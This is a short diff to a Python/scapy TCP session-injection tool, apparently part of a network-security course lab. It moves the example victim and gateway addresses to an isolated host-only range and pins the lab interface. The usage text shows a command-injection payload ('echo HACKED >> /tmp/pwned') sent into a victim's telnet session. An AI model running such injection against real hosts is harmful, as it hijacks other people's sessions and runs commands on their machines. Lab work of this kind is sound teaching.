@@ -18,8 +18,8 @@ encrypted sessions (TLS) but not usefully inject data into them.
 
 Usage:
   sudo python3 module4/tcp_injector.py \
-      --victim 10.0.0.2 \
-      --gateway 10.0.0.254 \
+      --victim 192.168.56.2 \
+      --gateway 192.168.56.254 \
       --port 23 \
       --payload "echo HACKED >> /tmp/pwned\n" \
       --iface eth0
@@ -39,6 +39,7 @@ from scapy.all import (
 sys.path.insert(0, "..")   # allow importing from sibling modules if needed
 
 conf.verb = 0
+conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)
 
 # Shared session state
 session = {
